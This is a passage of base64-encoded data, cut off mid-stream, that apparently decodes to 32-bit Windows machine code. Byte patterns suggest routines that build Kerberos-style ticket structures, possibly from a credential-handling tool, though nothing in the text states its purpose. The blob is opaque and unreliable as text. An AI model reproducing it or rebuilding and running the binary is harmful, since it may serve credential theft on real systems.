5oGL4BEI1GGFCNRhBQVv92PP90JBxopMEBEGgAEAAAV+hV1wAAg8QkhcB+CYvP6EfB///rCVf/FRCSARCL+IvHX8NVi+yD5PiD7HRTVot1DFcz22oHWYhcJGAzwI18JGHzq1Nmq1No1LQBEKqLfQhWV8dEJET0AQAAiVwkMIlcJCyJXCQoiVwkPOhL8f//g8QUaNTBARCJRCRAjUQkRFBo8MEBEFZX6C7x//+DxBRTjUQkJFBoAMIBEFZX6Bnx//+DxBSFwHUpU41EJCRQaACzARBWV+gA8f//g8QUhcB1EGjgyQEQ6HPO//9Z6asFAABTjUQkOFBoDMIBEFZX6Nfw//+DxBSFwA+EcwUAAFONRCQ8UGgcwgEQVlfouvD//4PEFIXAD4RPBQAAjUQkRFD/dCQ86FPTAACFwA+EJQUAAFONRCQYUGgkwgEQVlfoh/D//4PEFIXAdA3HRCQQAwAAAOmAAAAAU41EJBhQaCzCARBWV+hh8P//g8QUhcB1X1ONRCQYUGg0wgEQVlfoSPD//4PEFIXAdUZTjUQkGFBoRMIBEFZX6C/w//+DxBSFwHQKx0QkEBEAAADrK1ONRCQYUGhUwgEQVlfoDPD//4PEFIXAdBLHRCQQEgAAAOsIx0QkEBcAAAA5XCQUD4ReBAAAU41EJCBQaAyzARBWV+jX7///g8QUU41EJBxQaGTCARBWV+jC7///g8QUU41EJDBQaHTCARBWV+it7///g8QUhcB0E1NT/3QkNP8VzJMBEIPEDIlEJDBTjUQkMFBofMIBEFZX6IHv//+DxBSFwA+EowAAAIt8JCyJXCQMO/sPhKcAAABmOR90KVNTV/8VzJMBEIPEDIXAdAT/RCQMaixX/xV0kwEQi/hZWTv7dARHR3XSi0QkDDvDdHHB4ANQakD/FQySARCJRCQoO8N0SYt8JCwz9mY5H3Q7O3QkDHM1U1NX/xXMkwEQg8QMO8N0EItMJCjHRPEEBwAAAIkE8UZqLFf/FXSTARCL+FlZO/t0BEdHdcCLdQw5XCQMdA6LRCQoO8N0BolEJCzrEMdEJCxk1wIQx0QkDAUAAACNRCQkUP90JBTocdEAADvDD4z6AgAAjUQkYFCLRCQoi3gMi0QkGOiq7P//WYXAD4S3AgAAaIzCARCNRCQYUGiQwgEQVv91COhj7v//g8QUjUQkSFD/FYiRARBTU/90JBz/FVyTARCDxAxq/5loALo83FJQ6HEkAQBTaICWmAD/dCRUi/D/dCRUi/romCkBAItMJEgD8ItEJEwT+ivOG8doqMIBEIlEJFCJRCRYiUQkYI1EJBhQaLjCARD/dQyJTCRY/3UIiUwkZIlMJGzo3u3//4s1zJMBEIPEFFNT/3QkHP/WvwBGwyOLz/fhg8QM/3QkFAFEJFSNRCQYUBFUJFxoxMIBEP91DP91COig7f//g8QUU1P/dCQc/9b354PEDP90JDABRCRc/3QkPP90JDwRVCRo/3QkLGjYwgEQ6PLK//+DxBRoVMMBEOjlyv//i3wkEFk7+3Yci3QkLP92BP82aHDDARDoycr//4PEDIPGCE916Gh4wwEQ6LbK//9Zi0wkJItJDI1EJGBQM8Don+v//4tEJBRZ6DkWAABQaJTDARDojcr//1lZOVwkHHQQ/3QkHGikwwEQ6HfK//9ZWTlcJBh0EP90JBhoxMMBEOhhyv//WVlo5MMBEOhVyv//WY1EJEhQ6Cns//9Zvli9ARBW6D7K//9ZjUQkUFDoEuz//1lW6CzK//9ZjUQkWFDoAOz//8cEJKCtARDoFcr//1m4AMQBEDlcJDx1BItEJEBQaCzEARDo+sn///90JBSLRCQw/3QkOItMJCz/dCRA/3QkJP9wDI1EJHxQ/3QkZI1EJGz/dCQ8/3QkXP90JEzomQEAAIvwg8QwO/N0aejJtv//OVwkPHQkVov46Hr1//9ZhcB8SP90JDT/dCQkaFDEARDojsn//4PEDOsxUFb/dCRI6Au6//+DxAyFwHQMaOTEARDobcn//+sS/xXwkQEQUGgoxQEQ6FrJ//9ZWVb/FRCSARDrS2ioxQEQ6z6LRCQki1AMi0QkEOjZFAAAUFKNBBJQaAjGARDoKMn//4PEEOsfUP90JBRosMYBEOgUyf//g8QM6wtooMcBEOgFyf//Wf90JET/FRCSARDrJv8V8JEBEFBoWMgBEOjnyP//WesRaADJARDrBWhwyQEQ6NPI//9ZOVwkKHQK/3QkLP8VEJIBEF9eM8Bbi+Vdw1WL7IPsDI1F/FD/dQjo880AAIlF+IXAfHONRfRQi0X8agL/dRD/dQz/UCCJRfiFwHxaV4t9/Ikei08EM9KLw/fxhdJ0BivKA8uJDotHEAEG/zZqQP8VDJIBEIt9GIkHhcB0HlZQi0X8U/91FP919P9QJIlF+IXAfQj/N/8VEJIBEI1F9FCLRfz/UCxfi0X4ycNVi+yB7EwBAABTVlcz/2pgi/CNRZRXUIvZiX38iX2Q6EDaAACDxAxo1AAAAI2FvP7//1dQ6CvaAACLPQySARCDxAxqDGpA/9eJRaiFwHQf/3UIM8lBZolIAotNqDPAQGaJAYtFqIPABFDous0AAGoUakD/14lFkIXAdD5qAllmiUgCUYtNkFhmiQGLw4XbdQW4NMIBEFCLRZCDwARQ6IbNAACLRRCFwHUDi0UMUItFkIPADFDob80AAP91DI1FlFDoY80AAItFlItNmPfbG9uB4wAAwP+BwwAAQACJRayJRaCLRRyBywAAoECJXeCLXSBQakCJTbCJTaTHRegCAAAAiV3UiV3kiUXY/9eJRdyFwHQJ/3XYUOhfzAAAiwaJRbyLRgSJRcCLBomFuP7//4tGBImFvP7//4tGCIlFxItGDIlFyItGEIlFzItGFIlF0IPJ/4PrA7j///9/iYXE/v//iYXM/v//iYXU/v//iYXc/v//iYXk/v//i0WoiY3A/v//iY3I/v//iY3Q/v//iY3Y/v//iY3g/v//i0gEi0AIiYXs/v//i0UUiYVQ////i0UkiYUc////i0UoiY3o/v//iwiJjSD///+LTSzHhVz///8QAgAAiY0k////iYUo////dBiD6w50Dkt0B752////6w5qEOsCag9e6wW+e////41FFFCNRSRQi86Nhbj+///oeggAAIs9EJIBEFlZhcAPhL8AAABoTMoBEOj5xf//i10kWf91HP91GFb/dRTo8QkAAIPEEIXAD4ySAAAAaHDKARDo0cX//1n/dRSNRZBTUOhHFwAAi/CDxAyJdRSF9nRuaJDKARDorcX//1mNRfBQi8bot7L//1b/dRyNdez/dRiL2P91IOjU/P//g8QUhcB8K2jIygEQ6HzF//9ZjUWQagBQ6BoUAABZWYlF/IXAdBloAMsBEOhdxf//6wxQaDDLARDoUMX//1lZ/3UU/9f/dST/1zP2OXXwdAX/dfD/1zl13HQF/3Xc/9c5dah0Bf91qP/XOXWQdAX/dZD/14tF/F9eW8nDVYvsg+T4g+xUU4tdCFaLdQxXM8Az/1dmiUQkLGaJRCQuZolEJDRmiUQkNo1EJBRQaLTLARBWU4l8JCSJfCQsiXwkMIl8JECJfCRIx0QkNAAQAADHRCRkFwAAAMdEJGgRAAAAx0QkbBIAAADHRCRwAwAAAOgW5///V41EJDBQaACzARBWU+gE5///V41EJEhQaAzCARBWU+jy5v//V41EJGRQaMjLARBWU+jg5v//g8RQhcB0E1dX/3QkLP8VzJMBEIPEDIlEJCD/dCQQjUQkRFDoPMoAAP90JBiNRCRMUOguygAA/3QkHI1EJDxQ6CDKAABXjUQkPFBQ6FDKAACLRCQ4i0wkSIs1DJIBEI1ECAJmiUQkKg+3wFBqQP/WiUQkLDvHD4Q6AQAAjUQkOFCNRCQsUOgcygAAjUQkSFCNRCQsUOgNygAAi0QkQItMJCiNRAgCZolEJDIPt8BQakD/1olEJDQ7xw+E7QAAAI1EJEBQjUQkNFDo2ckAAI1EJChQjUQkNFDoyskAAIl8JBCLRCQQi0SEUI1MJBRRUOi9yAAAhcAPjJcAAACLRCQU/3AMakD/1ovYO98PhIIAAACDfCQQA41EJEB1BI1EJDCDPbTcAhAGU3MKUItEJBz/UDDrEf90JCSNTCQwUVCLRCQk/1AwO8d8NotEJBCLRIRQ6LAOAABQaKStARDoBMP//4tMJByLSQxTM8Do8uP//2igrQEQ6OvC//+DxBDrDVBo2MsBEOjbwv//WVlT/xUQkgEQ/0QkEIN8JBAED4I//////3QkNP8VEJIBEP90JCz/FRCSARBfXjPAW4vlXcNVi+yD7CRTVv8wjXX0jV3s6Bq0//9ZhcAPhLUCAABXi33sZosHiuiKzA+3wbkEBQAAZjvBD4WEAgAAZotHAorojV38iswPt8GNRAcEiUX8jUXcUI1F8FDofwMAAIt18FlZhfYPhGACAACNRdxQaFjMARDoIg0AAItF9INl+AAD+FlZiX3kOX38D4MjAgAA/3X4aHTMARDoC8L//1lZamRqQP8VDJIBEIv4iX30hf8PhO4BAACNRxxQjUcYUI1d/OgXAwAAjXcEVlfoDQMAAIsfg8QQ6PoOAACJRwyDxxCJfejosOH//4t9/GaLB4td9IroR0eKzA+3wYlDRGaLB4roR0eKzA+3wYlDVGaLB4roR0eKzA+3wYlDSIXAdB1QakD/FQySARCJQ0yFwHQN/3NIV1DosdMAAIPEDItDSI18BwSLB41zLA/I6AECAACDxwSLB41zNA/I6PIBAACDxwSLB41zPA/I6OMBAACDxwWLBw/Ig8cEjVX8iUNQiX386NgCAADo0wIAAIt1/IsGD8iDxgSJQ1zHQ1gCAAAAhcB0HVBqQP8VDJIBEIlDYIXAdA3/c1xWUOgu0wAAg8QMA3NcagGLBv916A/IjUQGBL44ogEQVolF/OjRxgAAhMAPha0AAACL++iECgAAg30MAHUKg30IAA+EowAAAGoBU+hODwAAi/BZWYl19IX2D4SMAAAA6Kat//+DfQgAi/h0I2iIzAEQ6H7A//9W6E3s//9ZWYXAfFFo1LUBEOhowP//WetE/3X4i/PoMAIAAIvwWYX2dDNX/3X0VujXsP//g8QMhcB0CFZowMwBEOsM/xXwkQEQUGj4zAEQ6CrA//9ZWVb/FRCSARD/dfT/FRCSARDrDVZogM0BEOgLwP//WVnozQwAAItF5P9F+DlF/A+C3f3//4t98OioDQAAi33s6wtoqM0BEOjev///WVf/FRCSARBf6xP/FfCRARBQaCjOARDowr///1lZXjPAW8nDg3wkBAB0EItEJAhqAGoB6AD9//9Z6wposM4BEOiZv///WTPAw2oAagBo6LwBEP90JBT/dCQU6Pvh//+DxBSDfCQEAHQPUItEJAxqAOjD/P//WesKaLDOARDoXL///1kzwMOZagAFAJEQtmiAlpgAg9ICUlDo9xcBAIkGi8LB+B+JVgTDVYvsUVGLCosBD8hmiUX6ZolF+A+3wIPBBAPBiQKJTfyLRfoDwGaJBoPAAmaJRgJXD7fAUGpAM///FQySARCJRgSFwHQhV41F+FBW6C7FAAAzyYXAD53Bi/mF/3UJ/3YE/xUQkgEQi8dfycNVi+xRUYsDg2X4AFaLdQhXi3gEgyYAD8+F/3RdjQT9BAAAAFBqQP8VDJIBEIkGhcB0R2aJeAKLA4sIixaLdQwPyWaJCoPACIvTiQPoRf///4Nl/ACJRfiF/3Yei0UIiwCLTfyNdMgEi9PoJ////yFF+P9F/Dl9/HLii0X4X17Jw4sKiwEPyIPBBIkKhcB2EFZIi3ECD86NTA4GdfSJCl7DU1eLzuiKCQAAaAAgAABqQIvY/xUMkgEQi/iF/3RvaBi+ARCF23QtiwaNSAxRg8AEUItGGIPABFD/dlD/dCQgaKTBARBoABAAAFfo+cUAAIPEJOsa/3ZQ/3QkFGg8zwEQaAAQAABX6N3FAACDxBgzyYXAD5/Bi8GFwHQJi8/oxq///+sJV/8VEJIBEIv4i8dfW8NVi+yD7CxTVleL8DPAiU3YjX3dZquqM9uNReRQUYld9Ild8Ild+Ild/Ild7OjAwgAAO8OJRegPjGABAACNRfBQjUX0UFboCwQAAIPEDIXAdBWLRfCLyIPhB4lF+HQIK8GDwAiJRfiNRfxQjU3s6KYGAABZhcB0D4td7IvDg+AHdAUr2IPDCItF5It4BIPHBIvHg+AHiX3gdAUr+IPHCIN99AAPhOUAAACDffwAD4TSAAAAi034jUR7SAPBi00MUGpAiQH/FQySARCL8ItFCIkwhfYPhKwAAACDZgQAi0XwiUYMxwYEAAAAx0YIAQAAAINmFADHRhBIAAAA/3YMi0YQ/3X0A8ZQ6NDOAACLReyJRhyLRfjHRhgKAAAAg8QMM8kDRhATThSJRiCJTiT/dhwDxv91/FDooc4AAItN4IlOLMdGKAYAAAAzwIPEDANeIMdF6AEAAAATRiSJXjCJRjSLRdiL04kEFolOPMdGOAcAAAAzyQN+MBNONIl+QIlORIvPiQQO/3X0/xUQkgEQg338AHQJ/3X8/xUQkgEQi0XoX15bycNVi+yD7BhWjUX8UP91DDP2iXX0iXXs6DLBAAA7xolF6A+M2QAAAIl18DkzD4bOAAAAjXMIV4sGg/gGdAWD+Ad1JotGCAPDjXgEi0X8/3AEagBX6NrNAACDxAyDPgZ1BYl99OsDiX3s/0Xwi0Xwg8YQOwNywYN99ABfD4SAAAAAg33sAHR6jUX4UItF/GoR/3UU/3UQ/1AciUXohcB8YYtF/FP/dQj/dfj/UBD/dfSLRfz/dfj/UBSNRfhQi0X8/1AYjUX4UItF/GoR/3UU/3UQ/1AciUXohcB8Jf919ItF/P9wBP91+P9QEP917ItF/P91+P9QFI1F+FCLRfz/UBiLReheycNVi+xRUYNl+ABXD7c+g8cMi8eD4AN0B2oEWSvIA/mLAwPHUGpA/xUMkgEQiUX8hcB0dmaLDotFCGaJCGaLTgJmiUgCi00MiUgEiwOLTRCLCVBR/3X86NjMAACLRfyLCwPIZotGAmbR6A+3wJmJAYlRBA+3BtHoiUEID7cGUP92BIPBDFHoqcwAAItFEIPEGP8w/xUQkgEQi0X8i00QATuJAcdF+AEAAACLRfhfycNVi+xRUYsOU1eL+I0E/QQAAAADyFFqQDPbiUX4/xUMkgEQiUX8hcB0U4sei0UMiwBTUP91/OhKzAAAi0X8A8ODxAyJOIX/dhmLTQiDwASLEYkQi1EEiVAEg8EIg8AIT3Xti0UM/zD/FRCSARCLRfyLTQyJAYtF+AEGM9tDX4vDW8nDVYvsUVGLRQgPtkABiw6NBIUIAAAAU4lF/IPABFcDyFFqQDPbiUX4/xUMkgEQi/iF/3RDix6LRQyLAFNQV+jAywAAi00ID7ZRAf91/I0EO4kQUYPABFDop8sAAItFDIPEGP8w/xUQkgEQi0UMiTiLRfgBBjPbQ1+Lw1vJw1WL7IHsAAEAADPAiUX0iUX8iUX4iYUM////U1ZXi30IiweJhRT///+LRwSJhRj///+LRwiJhRz///+LRwyJhSD///+LRxCJhST///+LRxSJhSj///+LRxiJhSz///+LRxyJhTD///+LRyCJhTT///+LRySJhTj///+LRyiJhTz///+LRyxqCFmJhUD///+NRfxQjYVE////aAQAAgBQjXcwjV34xoUA////AcaFAf///xBmiY0C////x4UE////zMzMzMeFEP///wAAAgDogv3//41F/FCNhUz///9oCAACAFCNdzjoav3//41F/FCNhVT///9oDAACAFCNd0DoUv3//41F/FCNhVz///9oEAACAFCNd0joOv3//41F/FCNhWT///9oFAACAFCNd1DoIv3//41F/FBoGAACAI2FbP///1CNd1joCv3//2aLR2BmiYV0////ZotHYmaJhXb///+LR2SJhXj///+LR2iDxEiNTfxR/3dwiYV8////i0dsi/OJRYDHRYQcAAIA6HL9//+LR3SNd3iJRYiNfYylpaWNRfxQpYt9CI1FnGggAAIAUI23iAAAAOiZ/P//jUX8UI1FpGgkAAIAUI23kAAAAOiB/P//jUX8UP+3mAAAAIvzx0WsKAACAOiZ/f//i4ecAAAAiUWwi4egAAAAi134iUW0i4ekAAAAiUW4i4eoAAAAi00QiUW8i4esAAAAiUXAi4ewAAAAiUXEi4e0AAAAiUXIi4e4AAAAiUXMi4e8AAAAiUXQi4fAAAAAiUXUjYPcAAAAg8QoM/aJhQj///+Ng+wAAACJddiJddyJdeCJdeSJdeiJAVBqQP8VDJIBEItNDIkBO8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